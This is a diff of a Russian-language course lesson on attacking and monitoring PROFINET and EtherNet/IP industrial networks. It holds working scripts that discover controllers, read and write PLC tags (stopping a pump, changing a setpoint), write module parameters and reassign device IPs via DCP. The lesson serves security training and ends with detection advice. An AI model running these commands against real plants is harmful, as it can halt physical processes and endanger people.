@@ -15,152 +15,127 @@ estimated_minutes: 70
 summary: "Промышленный Ethernet: PROFINET (DCP, RT/IRT, GSDML) и EtherNet/IP (CIP, explicit/implicit messaging, список тегов). Обнаружение, чтение и запись через явные сообщения, риски и защита."
 ---
 
-Если Modbus и DNP3 — это «серийные» протоколы, то **PROFINET** и **EtherNet/IP** — это промышленный Ethernet. Они работают поверх обычного TCP/IP и L2-кадров, но с жёсткими требованиями к детерминизму: привод должен получать данные каждые несколько миллисекунд. Это накладывает отпечаток и на архитектуру, и на безопасность. Здесь нет универсальной аутентификации: устройство в сети по умолчанию доверяет тому, кто говорит на правильном протоколе.
+## Вопрос, с которого всё начинается
 
-## PROFINET: общая картина
+В прошлом уроке мы разбирали DNP3 — «серийный» протокол телеметрии. Но на заводе, где конвейер должен получать команды каждые несколько миллисекунд, такие протоколы не годятся: нужен промышленный Ethernet с жёстким детерминизмом. Его строят на двух стандартах — **PROFINET** (Siemens) и **EtherNet/IP** (Rockwell).
 
-**PROFINET** — стандарт Siemens/PI (PROFIBUS & PROFINET International). Три роли:
+Вопрос урока: как найти устройства в промышленной Ethernet-сети, прочитать их данные и, главное, понять — можно ли писать в контроллер без пароля?
 
-- **IO-Controller** — «мозг» (ПЛК), управляет устройствами.
-- **IO-Device** — полевое устройство (модуль ввода-вывода, привод, датчик).
-- **IO-Supervisor** — инженерная станция для диагностики/настройки.
+## Наш пример: смешанный цех Siemens + Rockwell
+
+Перед нами сегмент `10.0.0.0/24` дискретного производства. На одном участке — Siemens с полевым модулем ввода-вывода, на другом — контроллер Rockwell. Сначала одним проходом посмотрим, кто вообще слушает типовые OT-порты:
+
+```bash
+$ nmap -p 102,502,44818,20000,34964 -sV --open 10.0.0.0/24
+Nmap scan report for 10.0.0.20
+PORT      STATE SERVICE
+102/tcp   open  iso-tsap
+502/tcp   open  mbap
+44818/tcp open  EtherNet-IP-2
+```
+
+Порт `102` (Siemens S7), `502` (Modbus) и `44818` (EtherNet/IP) на одном хосте — классический признак плохо сегментированного объекта: смешались оборудование двух вендоров и «прослойка» Modbus. Это уже интересно.
+
+## Шаг 1: PROFINET — кто здесь кто
+
+**PROFINET** — стандарт Siemens и ассоциации PI. Три роли:
+
+- **IO-Controller** — «мозг», это ПЛК; он управляет устройствами.
+- **IO-Device** — полевое устройство: модуль ввода-вывода, привод, датчик.
+- **IO-Supervisor** — инженерная станция для диагностики.
 
 Ключевые механизмы:
 
-- **DCP** (Discovery and Configuration Protocol) — обнаружение и назначение имени/IP по L2 (EtherType 0x8892).
-- **RT** (Real-Time) — циклический обмен реального времени, класс 1.
-- **IRT** (Isochronous Real-Time) — для motion-задач, синхронный.
-- **NRT/acyclic** — обычный TCP/UDP для параметризации (записи параметров, диагностика).
-- **GSDML** — XML-описание устройства (какие модули и параметры есть).
+- **DCP** (Discovery and Configuration Protocol) — обнаружение и назначение имени/IP по L2.
+- **RT** (Real-Time) — циклический обмен реального времени.
+- **IRT** (Isochronous RT) — синхронный, для задач движения (motion).
+- **GSDML** — XML-описание устройства: какие у него модули и параметры.
 
-Имя устройства (`имя.profinet`) — критично: IO-Controller привязывается к IO-Device **по имени**, не по MAC. Кто переименует устройство, тот перенаправит контроллер на другой физический модуль.
+Самое важное для атаки: IO-Controller привязывается к IO-Device **по имени**, а не по MAC. Кто переименует устройство — перенаправит контроллер на другой физический модуль.
 
-## EtherNet/IP: CIP внутри
+## Шаг 2: находим устройства по DCP
 
-**EtherNet/IP** — реализация **CIP** (Common Industrial Protocol) поверх Ethernet. Разработан Rockwell Automation (Allen-Bradley), сейчас — ODVA. Роли:
+DCP работает по «сырому» L2, поэтому шлём кадр на широковещательный PROFINET-адрес. **EtherType** — поле в Ethernet-кадре, которое говорит «это PROFINET»; у него значение `0x8892`:
 
-- **Scanner** (аналог IO-Controller) — опрашивает устройства.
-- **Adapter** (аналог IO-Device) — отвечает.
-
-CIP определяет объекты: **Identity (0x01)**, **Message Router (0x02)**, **Assembly (0x04)**, **Connection Manager (0x06)**, **TCP/IP Interface (0xF5)**, **Ethernet Link (0xF6)**. Два вида обмена:
-
-- **Implicit (Class 1)** — циклический через UDP/2222, по предварительно установленному соединению.
-- **Explicit** — запрос-ответ через TCP/44818; используется для настройки и чтения тегов.
-
-Именно **explicit messaging** и есть главный инструмент пентестера: через CIP можно читать и писать теги ПЛК.
-
-## Порты и EtherType
-
-| Протокол | Транспорт | Порт/тип |
-|----------|-----------|----------|
-| PROFINET DCP | L2 | EtherType 0x8892 |
-| PROFINET RT | L2 | EtherType 0x8892 |
-| PROFINET RPC | UDP/TCP | 34964 / 34963 |
-| EtherNet/IP explicit | TCP | 44818 |
-| EtherNet/IP implicit | UDP | 2222 |
-| ENIP-Discovery (ListIdentity) | UDP | 44818 |
-
-## Обнаружение устройств
-
-### PROFINET DCP
-
-```bash
-# Установить инструменты
-sudo apt install -y python3-scapy wireshark
-# Отправляем DCP Identify All (broadcast L2)
-python3 - <<'PY'
+```python
 from scapy.all import *
 from scapy.contrib.pnio import *
 pkt = Ether(dst="01:0e:cf:00:00:00")/PNIO()
 sendp(pkt, iface="eth0", loop=1, inter=1)
-PY
 ```
 
-Пример вывода Wireshark:
+Устройства отвечают, и в Wireshark мы видим их «паспорт»:
 
 ```text
 PROFINET DCP
   Service ID: Identify (0x05)
-  Service Type: Response Success (0x01)
-  Xid: 0x00000001
   Station Name: plc-line1
   IP: 10.0.0.20
-  Subnetmask: 255.255.255.0
   Device Vendor: Siemens
   Device Type: ET200SP
 ```
 
-Инструмент **`pnio_dcp`** (из пакета `profinet-tools`) делает это удобнее:
+Мы узнали имя `plc-line1`, адрес `10.0.0.20` и модель `ET200SP`. Готовым инструментом это делается одной командой (пакет `profinet-tools`):
 
 ```bash
-python3 pnio_dcp.py -i eth0 -l          # список устройств
-python3 pnio_dcp.py -i eth0 -n plc-line1 --set-ip 10.0.0.99
+$ python3 pnio_dcp.py -i eth0 -l
+plc-line1   10.0.0.20   ET200SP   Siemens
+valve-7     10.0.0.41   ET200SP   Siemens
 ```
 
-Последняя команда переименовывает/переназначает IP устройства — атака целостности (устройство пропадёт из-под контроля).
+## Шаг 3: EtherNet/IP — CIP внутри
 
-### EtherNet/IP ListIdentity
+**EtherNet/IP** — это реализация **CIP** (Common Industrial Protocol) поверх Ethernet. Здесь свои роли: **Scanner** (аналог IO-Controller) опрашивает, **Adapter** (аналог IO-Device) отвечает.
 
-```bash
-# Пакет ListIdentity по UDP/44818
-python3 - <<'PY'
+CIP описывает объекты: Identity, Assembly, Connection Manager и другие. Для нас важны два вида обмена:
+
+- **Implicit (Class 1)** — циклический, через UDP/2222, по заранее установленному соединению.
+- **Explicit** — запрос-ответ через TCP/44818; именно им читают и пишут теги.
+
+Обнаружить устройство можно запросом **ListIdentity** по UDP/44818:
+
+```python
 from scapy.all import *
 from scapy.contrib.enip import *
 pkt = Ether()/IP(dst="10.0.0.255")/UDP(sport=44818, dport=44818)/ENIP()/ENIPListIdentity()
 sendp(pkt, iface="eth0")
-PY
 ```
 
-Ответ содержит **Identity Object**:
+Ответ содержит Identity Object — «паспорт» контроллера:
 
 ```text
 EtherNet/IP ListIdentity Reply
   Vendor ID: 1 (Rockwell Automation/Allen-Bradley)
   Device Type: 14 (Programmable Logic Controller)
-  Product Code: 176
-  Revision: 3.3
-  Status: 0x0030
-  Serial: 0x1a2b3c4d
   Product Name: CompactLogix 5380
   State: RUN
   IP: 10.0.0.30
 ```
 
-`Product Name` и `State` сразу говорят, что это и работает ли контроллер. `State: RUN` — программа исполняется.
+`Product Name` говорит, что это за контроллер, а `State: RUN` — что программа сейчас исполняется. В `PROGRAM` логика не работает, и запись тега может не дать эффекта.
 
-## Чтение и запись тегов (EtherNet/IP)
+## Шаг 4: читаем теги
 
-Через explicit messaging читают/пишут **теги** (symbolic names) или **Assembly** объекты. Инструменты:
-
-| Инструмент | Язык | Назначение |
-|-----------|------|-----------|
-| `cpppo` | Python | полный ENIP/CIP-стек |
-| `pycomm3` | Python | работа с Logix-тегами |
-| `enip-python` | Python | низкоуровневый ENIP |
-| `RSEmulate`/`RSLinx` | Windows | легитимные инструменты |
-| `plcscan` | Python | обнаружение ПЛК |
-
-### Пример: чтение тега через cpppo
+**Тег** — это именованная переменная в программе ПЛК (например, `TankLevel`). Через explicit messaging их читают инструментом `cpppo`:
 
 ```bash
-pip install cpppo
-python3 - <<'PY'
+$ pip install cpppo
+$ python3 - <<'PY'
 from cpppo.server.enip.get_attribute import proxy_simple as proxy
 p = proxy(['10.0.0.30'])
 for tag in ['Program:MainProgram.TankLevel', 'Program:MainProgram.PumpRun']:
     v, = p.read([tag])
     print(tag, '=', v)
 PY
-```
-
-Пример вывода:
-
-```text
 Program:MainProgram.TankLevel = 78.4
 Program:MainProgram.PumpRun = True
 ```
 
-### Пример: запись тега
+Мы прочитали уровень в резервуаре и состояние насоса. Никакого пароля не потребовалось — explicit messaging по умолчанию открыт.
+
+## Шаг 5: пишем тег — и меняем физический процесс
+
+Записать тег так же просто:
 
 ```python
 from cpppo.server.enip.get_attribute import proxy_simple as proxy
@@ -169,187 +144,66 @@ p.write([('Program:MainProgram.PumpRun', False)])
 print("PumpRun set to False")
 ```
 
-Это останавливает насос — реальное физическое действие. Только в лаборатории или по разрешению.
-
-## PROFINET: запись параметров
-
-Acyclic (NRT) сервисы PROFINET позволяют читать/писать параметры модулей через RPC. Инструмент **`pnio`** / **`profinet-py`**:
-
-```bash
-pip install profinet-py
-python3 - <<'PY'
-from profinet import ProfinetDevice
-d = ProfinetDevice("eth0", "plc-line1")
-d.connect()
-print(d.read_parameters())          # список параметров модуля
-d.write_parameter("CycleTime", 16)  # записать параметр (мс)
-PY
-```
-
-Запись неверного параметра может нарушить цикл обмена и остановить линию.
-
-## Уязвимости и векторы атак
-
-- **Отсутствие аутентификации**: DCP/ENIP не проверяют, кто шлёт команды.
-- **Переименование устройств (DCP Set)**: подмена имени → контроллер работает с чужим модулем.
-- **Спуфинг IO-Device**: атакующий подменяет полевое устройство и подаёт ложные данные.
-- **Запись тегов**: изменение уставок/команд через CIP explicit.
-- **DoS на RT-трафик**: flood нарушает детерминизм, контроллер уходит в ошибку.
-- **Открытые инженерные порты** в IT-сети.
-- **GSDML/EDS с секретами**: файлы описания содержат параметры и иногда учётки.
-
-## Разобранный пример: смена IP IO-Device через DCP
-
-```text
-1. Обнаружили устройство: Station Name = valve-7, IP = 10.0.0.41
-2. Сбрасываем/меняем имя или IP через DCP Set
-3. IO-Controller теряет связь с valve-7
-4. Контроллер уходит в STOP, линия встаёт
-```
-
-Команда:
-
-```bash
-python3 pnio_dcp.py -i eth0 -n valve-7 --set-ip 10.0.0.241
-```
-
-Это демонстрация целостности, не требующая пароля. Защита — только сегментация и физический контроль, потому что DCP by design без аутентификации.
-
-## Edge cases и подводные камни
-
-- **Multicast vs broadcast**: DCP Identify идёт на multicast-MAC `01:0e:cf:00:00:00`; неверный dst = устройства не ответят.
-- **VLAN-теги**: промышленные сети часто в VLAN; ставьте свой интерфейс в нужный VLAN.
-- **Implicit-соединения** не читаются «на лету» — их надо установить; для анализа удобнее explicit.
-- **Assembly vs symbolic tags**: не все ПЛК поддерживают символические имена; для некоторых нужен EDS и Assembly.
-- **EDS-файлы**: без них часть инструментов не знает структуру данных.
-- **State: RUN/PROGRAM**: в PROGRAM контроллер логику не исполняет — запись тега может не дать эффекта.
-- **Класс 1 соединение занято** одним scanner'ом; второй scanner не всегда сможет подключиться.
-
-## Ссылочные таблицы
-
-| PROFINET | Значение |
-|----------|----------|
-| DCP | Discovery and Configuration Protocol |
-| RT / IRT | Real-Time / Isochronous RT |
-| GSDML | XML-описание устройства |
-| IO-Controller | управляющий ПЛК |
-| IO-Device | полевое устройство |
-
-| EtherNet/IP | Значение |
-|-------------|----------|
-| CIP | Common Industrial Protocol |
-| Scanner / Adapter | ведущий / ведомый |
-| Explicit | TCP/44818, запрос-ответ |
-| Implicit | UDP/2222, циклический |
-| Assembly Object | 0x04 |
-| Identity Object | 0x01 |
-
-## Что дальше / решение
-
-- Нужна эксплуатация ПЛК → `hardware-plc-deep`.
-- Нужен DNP3 → `hardware-dnp3`.
-- Нужен Modbus → `hardware-modbus-deep`.
-- Общий контекст OT → `hardware-ics`, `hardware-scada`.
-- Лаборатория → `Conpot`, `cpppo`, `GRFICS`.
-
-## Профили и опрос Modbus в промышленном Ethernet
-
-Хотя PROFINET и EtherNet/IP — самостоятельные протоколы, на объектах часто рядом живёт Modbus TCP (порт 502) для шлюзов и «прослоек». Полезно уметь быстро проверить весь промышленный Ethernet-сегмент:
-
-```bash
-# Один проход по типовым OT-портам
-nmap -p 102,502,44818,20000,4840,34964 -sV --open 10.0.0.0/24
-```
-
-Пример результата:
-
-```text
-Nmap scan report for 10.0.0.20
-PORT      STATE SERVICE
-102/tcp   open  iso-tsap
-502/tcp   open  mbap
-44818/tcp open  EtherNet-IP-2
-```
-
-Наличие 102 рядом с 44818 означает смешанную сеть Siemens + Rockwell — частый признак плохо сегментированного объекта.
-
-## Разбор трафика PROFINET RT
-
-RT-трафик идёт по L2, поэтому Wireshark должен видеть кадры напрямую. Полезные фильтры:
-
-```text
-pn_rt          # PROFINET Real-Time
-pn_dcp         # Discovery and Configuration
-enip           # EtherNet/IP
-cip            # CIP поверх ENIP
-```
-
-Пример разбора циклического обмена:
-
-```text
-PROFINET RT
-  FrameID: 0x8000 (RT Class 1)
-  CycleCounter: 123456
-  IOData: 8 bytes
-    Module 1: 0x0A 0x00 (input)
-    Module 2: 0x01 (output)
-```
-
-Изменение байтов `IOData` «на лету» (через прокси-устройство) — это спуфинг данных процесса: контроллер увидит ложные показания датчиков.
-
-## Оценка детерминизма и DoS
-
-RT/IRT требуют предсказуемого времени. Инструменты стресс-теста (только в лаборатории):
-
-```bash
-# Генерация фонового трафика для проверки устойчивости
-iperf3 -c 10.0.0.20 -t 60 -P 8
-# Наблюдение за счётчиками ошибок на коммутаторе (SNMP)
-snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.2.2.1.14
-```
-
-Рост `ifInErrors`/`ifOutDiscards` на промышленном коммутаторе указывает на перегрузку, при которой контроллер может уйти в ошибку цикла.
-
-## Разобранный пример: изменение уставки через EtherNet/IP
-
-```text
-1. Обнаружили CompactLogix (10.0.0.30, Product Name: CompactLogix 5380).
-2. Прочитали тег Program:MainProgram.Setpoint = 50.0
-3. Записали новое значение через cpppo.
-4. Проверили чтением — значение изменилось.
-```
-
-```bash
-python3 - <<'PY'
-from cpppo.server.enip.get_attribute import proxy_simple as proxy
-p = proxy(['10.0.0.30'])
-print("before:", p.read([('Program:MainProgram.Setpoint',)])[0])
-p.write([('Program:MainProgram.Setpoint', 75.0)])
-print("after: ", p.read([('Program:MainProgram.Setpoint',)])[0])
-PY
-```
-
-Пример вывода:
+Эта строка останавливает насос. **Это реальное физическое действие**, поэтому — только в лаборатории или по письменному разрешению. В лаборатории удобно проверить цикл «до/после»:
 
 ```text
 before: 50.0
 after:  75.0
 ```
 
-Это меняет технологический параметр. Только в лаборатории или по письменному разрешению.
+## Шаг 6: PROFINET — запись параметров
 
-## Мониторинг и базлайн
+PROFINET тоже позволяет писать параметры модулей через acyclic (NRT) сервисы:
 
-В OT-сети активное сканирование рискованно, поэтому основа — **пассивный мониторинг** и **базлайн**:
+```python
+from profinet import ProfinetDevice
+d = ProfinetDevice("eth0", "plc-line1")
+d.connect()
+print(d.read_parameters())
+d.write_parameter("CycleTime", 16)   # мс
+```
 
-- Захват зеркального порта: `tcpdump -i eth0 -n 'ether proto 0x8892 or tcp port 44818' -w ot.pcap`.
-- Нормальный профиль: кто с кем говорит, какие теги пишутся, когда.
-- Аномалии: новые DCP Set, необычные CIP-запросы записи, всплески Hard Reset.
-- Средства: Zeek с OT-скриптами, Nozomi, Claroty, Dragos.
+Неверный параметр может нарушить цикл обмена и остановить линию — это атака на целостность, не требующая пароля.
 
-Построив базлайн, вы замечаете попытки переименования устройств и записи тегов, которые в норме не происходят.
+## Шаг 7: почему защиты нет
+
+Корень проблемы: **DCP и ENIP by design не аутентифицируют отправителя.** Из этого вырастают векторы:
+
+- Переименование IO-Device через DCP Set — контроллер теряет свой модуль.
+- Спуфинг IO-Device — подмена полевого устройства с ложными данными.
+- Запись тегов через CIP explicit — смена уставок и команд.
+- DoS на RT-трафик — нарушение детерминизма, уход контроллера в ошибку.
+- GSDML/EDS-файлы описаний иногда содержат учётки и параметры.
+
+## Шаг 8: как это видят и ловят
+
+В OT-сети активное сканирование рискованно, поэтому основа — пассивный мониторинг. Захватываем зеркальный порт и строим базлайн:
+
+```bash
+$ tcpdump -i eth0 -n 'ether proto 0x8892 or tcp port 44818' -w ot.pcap
+```
+
+Полезные фильтры Wireshark: `pn_rt`, `pn_dcp`, `enip`, `cip`. В норме вы видите один и тот же циклический обмен; аномалия — внезапный `DCP Set`, необычная запись тега или всплеск Hard Reset. Именно так замечают переименование устройств и запись уставок, которых «не должно быть».
+
+## Что мы теперь знаем
+
+1. PROFINET и EtherNet/IP — промышленный Ethernet; работают по L2 (EtherType `0x8892`) и по TCP/UDP.
+2. DCP находит и **переименовывает** устройства по L2 — привязка идёт по имени, не по MAC.
+3. EtherNet/IP = CIP; explicit (TCP/44818) читает и пишет теги, implicit (UDP/2222) — циклический обмен.
+4. Теги читаются и пишутся без аутентификации (`cpppo`, `pycomm3`).
+5. Защита — только сегментация и физический контроль; протоколы сами отправителя не проверяют.
+
+## На что смотреть дальше
+
+- **Устройства не отвечают на DCP.** Проверьте dst-MAC `01:0e:cf:00:00:00` и VLAN: промышленные сети часто в VLAN, поставьте интерфейс в нужный.
+- **Implicit-соединения не читаются «на лету».** Их надо установить; для анализа удобнее explicit.
+- **Нет символических имён.** Некоторые ПЛК требуют EDS-файл и работу через Assembly-объекты.
+- **Второй scanner не подключается.** Class 1 соединение занято первым сканером.
+- **`State: PROGRAM`.** Запись тега может не дать эффекта — логика не исполняется.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "На каком EtherType работает PROFINET DCP?"
@@ -384,7 +238,7 @@ after:  75.0
     - "Формат файла"
   answer: 1
   explanation: "CIP — прикладной протокол, на котором стоит EtherNet/IP."
-- question: "Каким инструментом читают/пишут теги Allen-Bradley?"
+- question: "Каким инструментом читают и пишут теги Allen-Bradley?"
   options:
     - "nmap"
     - "cpppo / pycomm3"
@@ -393,6 +247,10 @@ after:  75.0
   answer: 1
   explanation: "cpppo и pycomm3 работают с ENIP/CIP и тегами Logix."
 ```
+
+## Куда дальше
+
+Мы научились читать и писать данные контроллера. В следующем уроке пойдём глубже — разберём, как устроен сам ПЛК: цикл сканирования, лестничную логику, режимы RUN/STOP и почему вмешательство в логику опаснее, чем в сеть. А пока запомни главное: **промышленный Ethernet не проверяет, кто говорит, — и это его главная слабость.**
 
 ## Где пригодится
 
